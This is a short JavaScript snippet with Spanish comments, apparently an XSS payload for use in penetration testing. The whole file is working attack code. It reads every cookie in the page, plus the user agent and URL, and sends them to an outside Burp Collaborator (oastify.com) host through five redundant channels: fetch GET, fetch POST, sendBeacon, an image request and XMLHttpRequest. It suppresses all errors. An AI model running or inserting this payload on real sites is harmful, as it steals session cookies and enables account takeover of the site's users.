(function(){
  try {
    var burp = "http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
    
    // Obtener TODAS las cookies sin filtrar
    var allCookies = document.cookie;
    var userAgent = navigator.userAgent;
    var url = window.location.href;
    
    // Método 1: Enviar cookies en plano por GET
    fetch(burp + '?cookies=' + encodeURIComponent(allCookies) + '&userAgent=' + encodeURIComponent(userAgent) + '&url=' + encodeURIComponent(url), {
      method: 'GET',
      mode: 'no-cors'
    }).catch(function(){});
    
    // Método 2: Enviar por POST en plano (sin JSON)
    var plainText = 'COOKIES: ' + allCookies + ' | USER-AGENT: ' + userAgent + ' | URL: ' + url;
    fetch(burp, {
      method: 'POST',
      mode: 'no-cors',
      body: plainText
    }).catch(function(){});
    
    // Método 3: Beacon con todo en plano
    navigator.sendBeacon(burp, plainText);
    
    // Método 4: Image con parámetros en plano
    new Image().src = burp + '?alldata=' + encodeURIComponent(plainText);
    
    // Método 5: XMLHttpRequest
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', burp, true);
      xhr.send(plainText);
    } catch(e){}
    
  } catch(e){}
})();
